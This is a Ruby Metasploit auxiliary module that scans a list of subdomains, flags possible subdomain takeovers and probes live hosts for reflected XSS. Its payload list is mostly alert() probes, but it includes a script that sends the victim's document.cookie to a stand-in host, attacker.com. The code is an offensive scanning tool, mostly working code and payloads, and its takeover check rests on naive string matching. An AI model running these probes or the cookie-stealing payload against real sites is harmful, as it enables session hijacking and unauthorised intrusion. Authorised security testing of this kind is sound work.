require 'msf/core'
require 'net/http'
require 'uri'

class MetasploitModule < Msf::Auxiliary
  def initialize
    super(
      'Name'        => 'Subdomain Takeover & XSS Scanner',
      'Description' => 'Scans a list of subdomains for active hosts, takeover vulnerabilities, and XSS flaws.',
      'Author'      => ['HAMZA EL-HAMDAOUI'],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('FILE', [true, 'Path to subdomain list file']),
        OptString.new('OUTPUT', [false, 'Path to save results', 'results.txt'])
      ]
    )
  end

  def run
    subdomains = File.readlines(datastore['FILE']).map(&:strip).reject(&:empty?)
    output_file = datastore['OUTPUT']

    File.open(output_file, 'w') do |file|
      subdomains.each do |subdomain|
        check_subdomain(subdomain, file)
      end
    end

    print_good("Scan completed! Results saved in #{output_file}")
  end

  def check_subdomain(subdomain, file)
    url = URI.parse("http://#{subdomain}")
    print_status("Checking #{url}")

    begin
      response = send_http_request(url)
      
      if response && response.code.to_i == 200
        if response.body.downcase.include?('unconfigured') || response.body.downcase.include?('not found')
          print_warning("[!] Potential Takeover: #{subdomain}")
          file.puts("Takeover: #{subdomain}")
        else
          print_good("[-] Active: #{subdomain} (#{response.code})")
          file.puts("Active: #{subdomain}")
          check_xss(subdomain, file)
        end
      else
        print_error("[x] No response from: #{subdomain}")
      end
    rescue => e
      print_error("[x] Error: #{e.message}")
    end
  end

  def check_xss(subdomain, file)
    payloads = [
      "<script>alert('XSS')</script>",
      "'><script>alert(1)</script>",
      "\"><img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>",
      "<body onload=alert(1)>",
      "<iframe src=javascript:alert(1)>",
      "<embed src=javascript:alert(1)>",
      "<script>new Image().src='http://attacker.com/'+document.cookie;</script>"
    ]
    
    payloads.each do |payload|
      test_url = URI.parse("http://#{subdomain}/?q=#{URI.encode_www_form_component(payload)}")
      response = send_http_request(test_url)
      
      if response && response.body.include?(payload)
        print_warning("[!] XSS Vulnerable: #{subdomain} with payload: #{payload}")
        file.puts("XSS: #{subdomain} | Payload: #{payload}")
        break
      end
    end
  end

  def send_http_request(url)
    Net::HTTP.start(url.host, url.port, use_ssl: url.scheme == 'https') do |http|
      request = Net::HTTP::Get.new(url)
      http.request(request)
    end
  rescue => e
    print_error("[x] HTTP Request Failed: #{e.message}")
    nil
  end
end

